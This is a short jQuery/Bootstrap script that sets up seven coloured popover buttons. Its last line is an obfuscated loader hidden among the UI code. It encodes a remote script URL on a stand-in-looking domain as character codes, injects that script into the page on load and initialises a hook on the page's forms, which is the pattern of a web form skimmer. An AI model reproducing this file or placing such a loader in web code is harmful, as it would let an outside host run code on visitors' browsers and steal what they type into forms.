/*
    Popovers
*/

$('.btn-popover-primary').popover({
    template: '<div class="popover popover-primary" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Primary",
    content: "Primary popover"
});

$('.btn-popover-success').popover({
    template: '<div class="popover popover-success" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Success",
    content: "Success popover"
});

$('.btn-popover-info').popover({
    template: '<div class="popover popover-info" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Info",
    content: "Info popover"
});

$('.btn-popover-danger').popover({
    template: '<div class="popover popover-danger" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Danger",
    content: "Danger popover"
});

$('.btn-popover-warning').popover({
    template: '<div class="popover popover-warning" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Warning",
    content: "Warning popover"
});

$('.btn-popover-secondary').popover({
    template: '<div class="popover popover-secondary" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Secondary",
    content: "Secondary popover"
});

$('.btn-popover-dark').popover({
    template: '<div class="popover popover-dark" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    title: "Dark",
    content: "Dark popover"
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b